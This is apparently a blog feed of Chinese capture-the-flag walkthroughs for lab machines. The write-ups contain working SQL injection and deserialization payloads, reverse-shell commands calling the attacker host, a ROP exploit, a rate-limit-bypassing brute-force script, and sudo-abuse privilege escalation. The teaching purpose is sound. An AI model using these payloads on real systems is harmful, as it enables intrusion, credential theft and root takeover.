利用SQL注入点，我们首先尝试获取数据库中的用户信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch -D news_db -T users --dump
...
Database: news_db
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | password1 | user1    |
| 2  | password2 | user2    |
+----+-----------+----------+
...
```

获取到的用户名和密码 (`user1:password1`) 看起来是无效的测试数据。接着，使用 `gobuster` 对网站目录进行爆破，发现一个隐藏目录 `/littlesecrets/`，其中包含一个登录页面 `login.php`。

由于数据库中的凭据无效，我们的策略转向读取Web服务器上的文件，以获取后台登录的真实逻辑。通过读取Apache的配置文件 `/etc/apache2/apache2.conf`，我们发现网站的根目录被修改为 `/var/www/he110wor1d`。

```bash
# 从apache2.conf中发现的关键配置
&lt;Directory /var/www/he110wor1d/&gt;
        Options -Indexes
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

&lt;VirtualHost *:80&gt;
    DocumentRoot /var/www/he110wor1d
...
```

利用这个信息，我们成功读取了 `login.php` 的源代码，并发现了数据库的连接密码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch --file-read='/var/www/he110wor1d/littlesecrets/login.php'
...
$servername = 'localhost';
$username = 'root';
$password = 'i_love_sing_dance_rap';
$dbname = 'news_db';
...
```

# **2. 身份伪造与命令执行**

接着读取登录成功后跳转的页面 `manager.php`，发现一个命令执行漏洞，但需要登录用户的用户名为 `he110wor1d_admin`。

```php
// 从 manager.php 源码中发现的关键代码
if ($_SESSION['username'] !== 'he110wor1d_admin') {
    die('Access Denied. You do not have permission to access this page.');
}
...
$command = $_POST['command'];
$command_output = shell_exec($command);
...
```

由于 `login.php` 的SQL查询存在缺陷，我们可以通过构造UNION查询来伪造身份。在登录框中输入以下payload：

*   **Username**: `' UNION SELECT 1, 'he110wor1d_admin', '1' #`
*   **Password**: `1`

成功登录后，我们进入了 `manager.php` 的命令执行面板。为了获得一个稳定的交互式Shell，我们执行反弹Shell命令。

首先，在攻击机上监听端口：

```bash
nc -lvnp 8888
```

然后在Web面板中执行：

```bash
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'
```

成功获取 `www-data` 用户的shell。

# **三、权限提升**

## **1. 水平提权：www-data -&gt; he110wor1d**

在获取 `www-data` 权限后，我们怀疑之前从 `login.php` 中泄露的数据库密码 `i_love_sing_dance_rap` 可能被系统用户 `he110wor1d` 复用。

```bash
www-data@singdancerap:/var/www/he110wor1d/littlesecrets$ su he110wor1d 
Password: i_love_sing_dance_rap
he110wor1d@singdancerap:/home$ id
uid=1001(he110wor1d) gid=1001(he110wor1d) groups=1001(he110wor1d)
```

成功切换到 `he110wor1d` 用户，并在其家目录下找到第一个flag。

```bash
he110wor1d@singdancerap:~$ cat user.txt
#SQL injection can not only retrieve data but also forge it.

User flag:107883ee-f5e4-11ef-8542-005056207011
```

## **2. 垂直提权：he110wor1d -&gt; root (SUID &amp; ROP)**

在 `he110wor1d` 用户的家目录下，发现一个拥有SUID权限的可执行文件 `thekey2root`。

```bash
he110wor1d@singdancerap:~/thekey2root$ ls -al
-rwsr-sr-x 1 root root 15472 Mar 1 00:23 thekey2root
```

使用 `checksec` 检查该文件，发现它是一个32位程序，没有PIE和Canary保护，但开启了NX。这是典型的ROP攻击场景。

```bash
[*] '/mnt/hgfs/gx/x/tmp/thekey2root'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

通过GDB动态调试，我们发现 `main` 函数中的 `input()` (即 `scanf`) 存在栈溢出漏洞。利用 `pattern create` 和 `pattern offset`，我们精算出覆盖返回地址所需的偏移量为 **32字节**。

我们的目标是利用程序中的 `system()` 函数来执行命令。为了获得root权限，我们需要一个能够提权的函数。`sing_dance_rap` 函数（地址 `0x08049213`）恰好可以做到这一点，因为它内部调用了 `setuid(0)` 和 `setgid(0)`。

**构造ROP链**：
我们的计划是，先跳转到 `sing_dance_rap` 提权，然后从 `sing_dance_rap` 返回时，再跳转到 `system` 函数，并让其执行我们想要的命令。

*   **填充**：32字节的垃圾数据。
*   **第一跳**：`sing_dance_rap` 的地址 (`0x08049213`)。
*   **第二跳**：`system@plt` 的地址 (`0x08049040`)。
*   **`system`的返回地址**：一个任意的占位地址 (e.g., `0xdeadbeef`)。
*   **`system`的参数**：在程序的只读数据段，我们发现了一个完美的字符串 `'s'`，其地址为 `0x0804a03e`。

**环境准备与攻击执行**：
在靶机上，我们通过环境变量劫持，让 `system('s')` 执行我们指定的反弹Shell脚本。

```bash
# 1. 在攻击机上监听端口
nc -lvnp 9999

# 2. 在靶机上准备环境 (he110wor1d用户下)
echo 'nc 192.168.205.128 9999 -e /bin/bash' &gt; s
chmod +x s
export PATH=.:$PATH
```

**最终Payload**:

```
'A'*32 + p32(0x08049213) + p32(0x08049040) + p32(0xdeadbeef) + p32(0x0804a03e)
```

在靶机上，使用Perl执行此payload：

```bash
he110wor1d@singdancerap:~/thekey2root$ perl -e 'print 'A'x32 . '\x13\x92\x04\x08' . '\x40\x90\x04\x08' . '\xef\xbe\xad\xde' . '\x3e\xa0\x04\x08'' | ./thekey2root
```

命令执行后，程序会看似卡住，此时我们的攻击机已收到 `root` 权限的反弹Shell。

# **四、夺取旗帜**

成功获取 `root` shell后，读取最终的flag。

```bash
root@singdancerap:~# id
uid=0(root) gid=0(root) groups=0(root),1001(he110wor1d)
root@singdancerap:~# cat /root/root.txt
#During the process of PWN, the execution of the system function does not necessarily have to be bash.

root flag:943ac8c9-f696-11ef-8bd4-005056207011
```

至此，靶机`singdancerap`的所有挑战均已完成。
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_SingDanceRap.html</guid><pubDate>Wed, 06 Aug 2025 00:49:38 +0000</pubDate></item><item><title>内部_config</title><link>https://7r1UMPHK.github.io/post/nei-bu-_config.html</link><description># **一、信息收集**

## 1. 主机发现

首先，在本地网络中使用 `arp-scan` 工具进行主机发现，确定目标靶机的 IP 地址为 `192.168.205.241`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.241 08:00:27:31:f6:a3       PCS Systemtechnik GmbH
...
```

## 2. 端口与服务扫描

使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 两个端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.241
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 07:27 EDT
Nmap scan report for 192.168.205.241
Host is up (0.000094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:31:F6:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

## 3. Web目录枚举与漏洞发现

访问 80 端口是一个静态网页，没有可交互的功能。使用 `gobuster` 进行目录爆破，发现了一个 `/config` 目录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.241 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 64
...
/config               (Status: 301) [Size: 169] [--&gt; http://192.168.205.241/config/]
...
```

对 `/config/` 目录进行深度爆破未果。在尝试多种路径后，发现 Web 服务器存在目录穿越漏洞，通过访问 `/config../` 可以跳出当前 Web 根目录的限制。利用此漏洞，我们继续对上层目录进行爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.241/config../ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64
...
/config.txt           (Status: 200) [Size: 41]
...
```

成功发现了一个名为 `config.txt` 的敏感文件。

# **二、初始访问**

## 1. 凭证获取

使用 `curl` 读取通过目录穿越漏洞发现的 `config.txt` 文件，成功获取到一组 SSH 登录凭证。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.241/config../config.txt
SSH Credentials: mikannse/mikannsebyebye
```

凭证为 `mikannse:mikannsebyebye`。

## 2. SSH登录与Shell逃逸

利用获取到的凭证成功登录 SSH。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh mikannse@192.168.205.241
```

登录后发现当前 Shell 是一个受限环境（类似于 `less` 或 `more`），无法直接执行命令。在这种环境下，可以通过 `less` 的内部命令 `!` 来执行外部 Shell 命令。输入 `!/bin/bash` 成功获得一个标准的 Bash Shell。

# **三、权限提升**

## 1. Sudo权限分析

获得初始 Shell 后，首先查看当前用户 `mikannse` 的家目录，并读取 `user.txt` 获得第一个 flag。

```bash
mikannse@Config:~$ ls -al
total 36
drwx------ 2 mikannse mikannse 4096 Jul  5 00:50 .
drwxr-xr-x 3 root     root     4096 Jul  4 23:36 ..
-rw-r--r-- 1 mikannse mikannse  175 Jul  4 23:37 banner.txt
lrwxrwxrwx 1 root     root        9 Jul  4 23:40 .bash_history -&gt; /dev/null
-rw-r--r-- 1 mikannse mikannse  220 Jul  4 23:36 .bash_logout
-rw-r--r-- 1 mikannse mikannse 3526 Jul  4 23:36 .bashrc
-rw------- 1 mikannse mikannse   33 Jul  5 00:50 .lesshst
-rw-r--r-- 1 root     root      551 Jul  5 00:50 mikannse.conf
-rw-r--r-- 1 mikannse mikannse  847 Jul  4 23:38 .profile
-rw-r--r-- 1 root     root       48 Jul  4 23:37 user.txt
mikannse@Config:~$ cat user.txt 
flag{user-530773d6-5951-11f0-89d9-836ccaf94d6b}
```

注意到其中有一个 `root` 用户所有的配置文件 `mikannse.conf`。接着，执行 `sudo -l` 查看当前用户的 `sudo` 权限。

```bash
mikannse@Config:~$ sudo -l
Matching Defaults entries for mikannse on Config:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mikannse may run the following commands on Config:
    (root) NOPASSWD: /usr/sbin/nginx -c /home/mikannse/mikannse.conf
```

结果显示，`mikannse` 用户可以无密码以 `root` 权限执行 `nginx` 命令，并强制使用 `/home/mikannse/mikannse.conf`作为配置文件。

## 2. Nginx配置劫持提权

虽然我们无法直接写入由 `root` 拥有的 `mikannse.conf` 文件，但该文件位于我们的家目录 `/home/mikannse` 下，这意味着我们对该目录有写权限。因此，我们可以先将原文件重命名或删除，然后创建一个同名的恶意配置文件来劫持 `sudo` 执行流程。

**提权步骤:**

1.  将原始的 `mikannse.conf` 文件重命名，以作备份。
2.  创建一个新的 `mikannse.conf` 文件。
3.  在新配置文件中，配置 Nginx 启动一个新的 Web 服务（例如在 8081 端口），其根目录指向 `/root` 目录，并开启目录列表功能 (`autoindex on`)。

```bash
# 移动原配置文件
mikannse@Config:~$ mv /home/mikannse/mikannse.conf a

# 创建并写入恶意配置文件
mikannse@Config:~$ vim mikannse.conf 
mikannse@Config:~$ cat mikannse.conf
user root;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    server {
        listen       8081;          
        server_name  Config;     
        
        # 关键配置：将/files路径映射到/root/目录
        location /files {
            alias /root/;
            autoindex on; # 开启目录浏览
        }
    }
}
```

4.  使用 `sudo` 执行 Nginx 命令，使其以 `root` 权限加载我们的恶意配置。

```bash
mikannse@Config:~$ sudo /usr/sbin/nginx -c /home/mikannse/mikannse.conf
```

执行后，Nginx 会在后台以 `root` 身份启动一个监听 8081 端口的 Web 服务，该服务会将 `/root` 目录的内容暴露出来。

# **四、夺取旗帜**

回到攻击机，使用 `curl` 访问目标靶机 `192.168.205.241` 的 8081 端口。

首先，访问 `/files/` 路径，由于开启了 `autoindex`，服务器会列出 `/root` 目录下的所有文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.241:8081/files/
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Index of /files/&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Index of /files/&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href='../'&gt;../&lt;/a&gt;
&lt;a href='root.txt'&gt;root.txt&lt;/a&gt;                                           05-Jul-2025 03:54                  48
&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
&lt;/html&gt;
```

在列表中我们看到了 `root.txt` 文件。接着直接读取该文件，获得最终的 root flag。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.241:8081/files/root.txt
flag{root-bf116e68-5953-11f0-b06c-63e27ce93d04}
```

至此，user 和 root 两个 flag 均已获取，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_config.html</guid><pubDate>Wed, 06 Aug 2025 00:49:16 +0000</pubDate></item><item><title>内部_sky</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sky.html</link><description>![image-20250728205701542](http://7r1UMPHK.github.io/image/20250728205701809.webp)

# 一、信息收集

## 1. 主机发现

使用 `arp-scan` 扫描本地网络，发现目标主机 IP 地址为 `192.168.205.230`。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.230 08:00:27:03:0e:34       PCS Systemtechnik GmbH
...
```

## 2. 端口与服务扫描

使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 端口

```bash
┌──(kali㉿kali)-[/tmp]
└─$ nmap -p- 192.168.205.230
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 08:58 EDT
Nmap scan report for 192.168.205.230
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:03:0E:34 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

## 3. Web 目录枚举

使用 `gobuster` 对 Web 服务进行目录爆破，发现多个 PHP 文件，包括 `login.php`, `check.php`, `secret.php` 等关键页面。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.205.230 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
[+] Url:                     http://192.168.205.230
...
/index.html           (Status: 200)
/login.php            (Status: 200)
/logout.php           (Status: 302) --&gt; login.php
/check.php            (Status: 200)
/ok.php               (Status: 302) --&gt; login.php
/secret.php           (Status: 200)
...
===============================================================
```

# 二、初始访问

## Web 渗透 (Port 80)

### 1. 登录绕过与爆破

访问 `http://192.168.205.230`，进入一个登录页面。`secret.php` 页面提示“大门似乎无法被暴力打开”，暗示可能存在防爆破机制。

经过测试，发现登录验证接口 `check.php` 存在 CSRF Token 校验，并且有基于 IP 的登录尝试限制。通过在 HTTP 请求头中伪造 `X-Forwarded-For` 字段，可以绕过此 IP 限制。

编写 Python 脚本，在每次尝试密码前都先请求登录页获取新的 CSRF Token，并伪造来源 IP，成功爆破出 `admin` 用户的密码为 `superman1`。

**攻击脚本**

```python
import requests
import re
from time import sleep
from random import randint

LOGIN_URL = 'http://192.168.205.230/login.php'
CHECK_URL = 'http://192.168.205.230/check.php'
USERNAME = 'admin'
PASSWORD_LIST_PATH = '/usr/share/wordlists/rockyou.txt'

def gen_ip():
    return f'{randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}'

def main():
    print('--- 开始攻击 ---')
    print(f'[*] 目标URL: {CHECK_URL}')
    print(f'[*] 用户名: {USERNAME}')
    print(f'[*] 密码字典: {PASSWORD_LIST_PATH}')
    print('-' * 20)

    session = requests.Session()

    try:
        with open(PASSWORD_LIST_PATH, 'r', encoding='latin-1') as f:
            for pwd in f:
                pwd = pwd.strip()
                if not pwd:
                    continue

                try:
                    ip = gen_ip()
                    headers = {
                        'X-Forwarded-For': ip,
                        'X-Originating-IP': ip,
                        'X-Remote-IP': ip,
                        'X-Remote-Addr': ip
                    }
                    
                    print(f'[*] 正在为密码 '{pwd}' 获取新Token... (IP: {ip})')
                    r = session.get(LOGIN_URL, headers=headers)
                    token_match = re.search(r'id='csrfToken' value='([a-f0-9]{16})'', r.text)
                    if not token_match:
                        print('[!] 无法获取Token，可能被封IP或页面变更。')
                        break

                    token = token_match.group(1)
                    print(f'[*] 获取成功, Token: {token}')

                    data = {
                        'username': USERNAME,
                        'password': pwd,
                        'csrf_token': token
                    }

                    res = session.post(CHECK_URL, data=data, headers=headers)
                    print(f'[*] 正在尝试密码: {pwd}')

                    if '密码错误' not in res.text and '用户名错误' not in res.text and '登录尝试次数过多' not in res.text:
                        print('\n' + '='*40)
                        print(f'[+] !!! 攻击成功 !!!')
                        print(f'[+] 用户名: {USERNAME}')
                        print(f'[+] 密码: {pwd}')
                        print(f'[+] 响应内容: {res.text}')
                        print('='*40)
                        return

                    if '用户名错误' in res.text:
                        print('[!] 用户名错误，停止爆破。')
                        return
                        
                    if '登录尝试次数过多' in res.text:
                        print('[!] 账户被锁定，稍等5分钟...')
                        sleep(300)

                except requests.RequestException as e:
                    print(f'[!] 请求异常: {e}')
                    sleep(5)

    except FileNotFoundError:
        print(f'[!] 密码字典未找到: {PASSWORD_LIST_PATH}')
    except Exception as e:
        print(f'[!] 未知错误: {e}')

if __name__ == '__main__':
    main()
```

### 2. PHP 反序列化漏洞利用

![image-20250728210931335](http://7r1UMPHK.github.io/image/20250728210932754.webp)

成功登录后，发现 `ok.php` 页面存在 PHP 反序列化漏洞，其代码如下：

```php
if (isset($_GET['data'])) {
    $data = $_GET['data'];
    unserialize($data);
}
```

`unserialize` 函数的参数直接取自 GET 请求，存在严重安全风险。通过分析应用程序的类（`UserSession`, `CacheManager`, `FileHandler`, `SystemExecutor`），可以构造一条 POP (Property-Oriented Programming) 链，最终实现远程代码执行。

**POP 链利用思路：**
`UserSession` -&gt; `CacheManager` -&gt; `FileHandler` -&gt; `SystemExecutor`

通过此链条，最终会触发 `SystemExecutor` 类中的 `__destruct` 方法执行系统命令。

**Payload 生成脚本:**

```python
import urllib.parse

class SystemExecutor: pass
class FileHandler: __init__ = lambda s,p,f: setattr(s,'process',p) or setattr(s,'filename',f)
class CacheManager: __init__ = lambda s,c: setattr(s,'cacheFile',c)
class UserSession: __init__ = lambda s,l: setattr(s,'logger',l)

def php_ser(obj):
    if isinstance(obj, str):
        return f's:{len(obj)}:'{obj}';'
    if isinstance(obj, SystemExecutor):
        return 'O:14:'SystemExecutor':0:{}'
    if isinstance(obj, FileHandler):
        d = php_ser('process')+php_ser(obj.process)
        d += php_ser('filename')+php_ser(obj.filename)
        return f'O:11:'FileHandler':2:{{{d}}}'
    if isinstance(obj, CacheManager):
        d = php_ser('cacheFile')+php_ser(obj.cacheFile)
        return f'O:12:'CacheManager':1:{{{d}}}'
    if isinstance(obj, UserSession):
        d = php_ser('logger')+php_ser(obj.logger)
        return f'O:11:'UserSession':1:{{{d}}}'
    return 'N;'

def g():
    c = input('输入命令: ').strip()
    e = SystemExecutor()
    f = FileHandler(e, c)
    cm = CacheManager(f)
    us = UserSession(cm)
    p = php_ser(us)
    u = f'http://192.168.205.230/ok.php?data={urllib.parse.quote(p)}'
    print(f'[*] 序列化字符串:\n{p}\n')
    print(f'[*] 攻击URL:\n{u}')

if __name__ == '__main__':
    g()
```

尝试利用

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 b.py
输入命令: id
[*] 序列化字符串:
O:11:'UserSession':1:{s:6:'logger';O:12:'CacheManager':1:{s:9:'cacheFile';O:11:'FileHandler':2:{s:7:'process';O:14:'SystemExecutor':0:{}s:8:'filename';s:2:'id';}}}

[*] 攻击URL:
http://192.168.205.230/ok.php?data=O%3A11%3A%22UserSession%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A12%3A%22CacheManager%22%3A1%3A%7Bs%3A9%3A%22cacheFile%22%3BO%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A7%3A%22process%22%3BO%3A14%3A%22SystemExecutor%22%3A0%3A%7B%7Ds%3A8%3A%22filename%22%3Bs%3A2%3A%22id%22%3B%7D%7D%7D
```

去web看了一下，返回了good，那弹shell

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 b.py
输入命令: busybox nc 192.168.205.128 8888 -e /bin/bash
[*] 序列化字符串:
O:11:'UserSession':1:{s:6:'logger';O:12:'CacheManager':1:{s:9:'cacheFile';O:11:'FileHandler':2:{s:7:'process';O:14:'SystemExecutor':0:{}s:8:'filename';s:44:'busybox nc 192.168.205.128 8888 -e /bin/bash';}}}

[*] 攻击URL:
http://192.168.205.230/ok.php?data=O%3A11%3A%22UserSession%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A12%3A%22CacheManager%22%3A1%3A%7Bs%3A9%3A%22cacheFile%22%3BO%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A7%3A%22process%22%3BO%3A14%3A%22SystemExecutor%22%3A0%3A%7B%7Ds%3A8%3A%22filename%22%3Bs%3A44%3A%22busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash%22%3B%7D%7D%7D
```

在本地使用 `netcat` 开启监听，然后访问构造好的 URL，成功接收到 `www-data` 用户的反弹 shell。

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.230] 55154
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 三、权限提升

## 1. 从 `www-data` 到 `sky`

在 `www-data` 用户的 shell 中，于网站根目录 `/var/www/html` 下发现一个名为 `ll1045670921.php` 的可疑文件。查看其内容，获得了一个密钥/密码：`bf4e842c9fea1b77`。

```bash
www-data@sky:/var/www/html$ cat ll1045670921.php
&lt;?php
...
// 看来你找到了通往天空的密钥：bf4e842c9fea1b77
?&gt;
```

通过 `ls /home` 发现存在用户 `sky`。使用该密钥作为密码，成功切换到 `sky` 用户，并读取到第一个 flag。

```bash
www-data@sky:/var/www/html$ su sky
Password: &lt;在此输入密钥&gt;
sky@sky:/var/www/html$ cd
sky@sky:~$ cat user.txt
# 恭喜你，找到了第一个国王秘宝
flag{user-TheNineHeavensBlackMagicScroll}
```

## 2. 从 `sky` 到 `root` (`git-dumper` 提权)

使用 `sudo -l` 命令检查 `sky` 用户的权限，发现该用户可以无密码执行 `/usr/local/bin/git-dumper` 命令。

```bash
sky@sky:~$ sudo -l
...
User sky may run the following commands on sky:
    (ALL) NOPASSWD: /usr/local/bin/git-dumper
```

`git-dumper` 工具用于从网站下载暴露的 `.git` 仓库。其接受两个主要参数：源 URL 和输出目录。由于 `sudo` 允许以 root 身份运行此程序，并且可以指定任意输出目录，这便构成了一个典型的**任意文件写入**漏洞。 我们可以利用此漏洞向 `/etc/sudoers.d/` 目录写入一个自定义的 sudoers 配置文件，从而为 `sky` 用户授予完全的 root 权限。

**攻击步骤：**

1.  **在攻击机 (Kali) 上创建恶意 git 仓库：**
    *   创建一个新目录并初始化为 git 仓库。
    *   在仓库中创建一个文件（例如 `sky_privs`），内容为 `sky ALL=(ALL:ALL) NOPASSWD: ALL`。
    *   将此文件添加到 git 并提交。
    *   在仓库目录下启动一个临时的 HTTP 服务器。

    ```bash
    # 在 Kali 上执行
    ┌──(kali㉿kali)-[/tmp]
    └─$ mkdir git_exploit &amp;&amp; cd git_exploit
    ┌──(kali㉿kali)-[/tmp/git_exploit]
    └─$ git init
    ┌──(kali㉿kali)-[/tmp/git_exploit]
    └─$ echo 'sky ALL=(ALL:ALL) NOPASSWD: ALL' &gt; sky_privs
    ┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/gitexp]
    └─$ git config user.name 'xxoo'
    ┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/gitexp]
    └─$ git config user.email 'xxoo@x.com'
    ┌──(kali㉿kali)-[/tmp/git_exploit]
    └─$ git add sky_privs &amp;&amp; git commit -m 'pwn'
    ┌──(kali㉿kali)-[/tmp/git_exploit]
    └─$ python3 -m http.server 80

2. **在靶机上利用 `git-dumper` 写入文件：**

   *   以 `sky` 用户身份，使用 `sudo` 执行 `git-dumper`。
   *   URL 指向攻击机的 HTTP 服务器。
   *   输出目录指定为 `/etc/sudoers.d/`。`git-dumper` 会将仓库中的文件恢复到该目录。

   ```bash
   # 在靶机上执行
   sky@sky:~$ sudo /usr/local/bin/git-dumper http://192.168.205.128 /etc/sudoers.d/
   ...
   [-] Running git checkout .
   Updated 1 path from the index
   ```

3. **验证并获取 Root Shell：**
   执行成功后，再次检查 `sudo` 权限，可以看到新的规则已生效。现在可以直接切换到 root 用户。

   ```bash
   sky@sky:~$ sudo -l
   ...
   User sky may run the following commands on sky:
       (ALL) NOPASSWD: /usr/local/bin/git-dumper
       (ALL : ALL) NOPASSWD: ALL   &lt;-- 提权成功！
   
   sky@sky:~$ sudo bash
   root@sky:/home/sky# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

# 四、夺取旗帜

获取 root 权限后，读取所有旗帜文件。

```bash
root@sky:/home/sky# cat /home/sky/user.txt /root/root.txt 
# 恭喜你，找到了第一个国王秘宝
flag{user-TheNineHeavensBlackMagicScroll}
# 恭喜你，找到了最终的王国秘藏
flag{root-TheSwordoftheSky}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sky.html</guid><pubDate>Wed, 06 Aug 2025 00:48:32 +0000</pubDate></item><item><title>内部_Node</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Node.html</link><description>看到一个有意思的靶机，水个wp

宇宙声明，其中有一些知识点可能会出现错误，介意勿看，当然你有更好的观点可以提出来，我进行修改，谢谢。
# 靶机渗透测试报告：Node

![image-20250726214136966](http://7r1UMPHK.github.io/image/20250727170012871.webp)

## 一、信息收集

### 1. 主机发现

使用 `arp-scan` 扫描本地网络，发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.223 08:00:27:50:f2:67       PCS Systemtechnik GmbH
...
```

目标主机 IP 地址为 `192.168.205.223`。

### 2. 端口与服务扫描

使用 `nmap` 对目标主机进行端口扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.223
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 09:42 EDT
Nmap scan report for 192.168.205.223
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:50:F2:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

扫描发现开放了 22 (SSH) 和 3000 端口。3000 端口通常用于 Web 开发服务。

# 二、初始访问

## Web 渗透 (Port 3000)

访问 `http://192.168.205.223:3000`，发现一个 Web 应用，这是一个多阶段的 Node.js 原型链污染挑战。

![image-20250726214316960](http://7r1UMPHK.github.io/image/20250727170021649.webp)

这里两个玩法，第一种你过了第一题，下一个FindSomething插件，你会发现有一个PATH`/admin/flag`，一看就有问题好吧，那里会直接获得ssh的用户和密码（要做一题拿个admin的cookie）

第二种就是老老实实的

- **关卡 1: 基础原型污染**

```json
{
  '__proto__': {
    'isAdmin': true
  }
}
```

- **关卡 2: 绕过简单防护**

```json
{
  'constructor': {
    'prototype': {
      'isAdmin': true
    }
  }
}
```

- **关卡 3: 多层原型污染**

```json
{
  'a': {
    '__proto__': {
      'isAdmin': true
    }
  }
}
```

- **关卡 4: 动态验证绕过**

```json
{
  'validateAccess': 'function() { return true; }'
}
```

*ps:这不像原型链污染，反而很像不安全反序列化*

成功完成所有关卡后，应用返回凭证信息：

&gt;挑战成功!
&gt;
&gt;你的Flag是: **{hungry:imveryhungry}**
&gt;
&gt;恭喜你完成了挑战！

### SSH 登录

使用获取到的凭证通过 SSH 登录目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh hungry@192.168.205.223
...
hungry@Node:~$ id
uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
```

成功获取 `hungry` 用户的 shell 权限。

## 三、权限提升

## 1. 本地信息枚举

在 `hungry` 用户的 shell 中，进行提权向量的枚举。



* **检查 `sudo` 权限：**

  ```bash
  hungry@Node:~$ sudo -l
  Sorry, user hungry may not run sudo on Node.
  ```

  用户 `hungry` 没有任何 `sudo` 权限。

* **查找 SUID 文件：**

  ```bash
  hungry@Node:~$ find / -perm -4000 -type f 2&gt;/dev/null
  /usr/bin/chsh
  /usr/bin/chfn
  /usr/bin/newgrp
  /usr/bin/gpasswd
  /usr/bin/mount
  /usr/bin/su
  /usr/bin/umount
  /usr/bin/pkexec
  /usr/bin/sudo
  /usr/bin/passwd
  ...
  /usr/libexec/polkit-agent-helper-1
  ```

我就不继续写了，我扒拉了很久，实在顶不住了，我去找作者要了点提示，是`/usr/libexec/polkit-agent-helper-1`

## 2. 漏洞利用 (`systemd-run` 提权)

根据提示，尝试使用与 Polkit 交互的 `systemd-run` 命令进行提权。

https://blog.csdn.net/li1136594919/article/details/131488386

```bash
hungry@Node:~$ systemd-run -t /bin/bash
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.
Authenticating as: hungry
Password: 
